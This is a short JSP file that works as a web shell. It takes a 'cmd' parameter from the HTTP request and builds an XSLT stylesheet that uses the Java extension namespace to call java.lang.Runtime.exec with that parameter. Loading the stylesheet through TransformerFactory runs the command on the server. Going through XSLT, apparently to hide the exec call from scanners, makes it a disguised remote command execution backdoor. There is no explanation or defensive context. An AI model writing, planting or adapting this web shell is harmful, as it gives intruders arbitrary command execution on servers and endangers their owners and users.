<%@ page import="java.io.*" %>
<%@ page import="javax.xml.transform.Transformer" %>
<%@ page import="javax.xml.transform.stream.StreamResult" %>
<%@ page import="javax.xml.transform.TransformerFactory" %>
<%@ page import="javax.xml.transform.stream.StreamSource" %>
<%
    String cmd = request.getParameter("cmd");
    String s = "  <xsl:stylesheet version=\"1.0\" " +
            "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" " +
            "xmlns:rt=\"java.lang.Runtime\"> " +
            "    <xsl:template match=\"/\">\n" +
            "      <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\n" +
            "      <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'"+cmd+"')\"/>\n" +
            "      <xsl:variable name=\"ddd\" select=\"$process\"/>\n" +
            "      <xsl:value-of select=\"$ddd\"/>\n" +
            "    </xsl:template>\n" +
            "  </xsl:stylesheet>";
    InputStream in = new ByteArrayInputStream(s.getBytes());
    StreamResult result = new StreamResult(new ByteArrayOutputStream());
    Transformer t = TransformerFactory.newInstance().newTransformer(new StreamSource(in));
    t.transform(new StreamSource(new ByteArrayInputStream("<?xml version=\"1.0\" encoding=\"UTF-8\"?><data></data>".getBytes())),result);

%>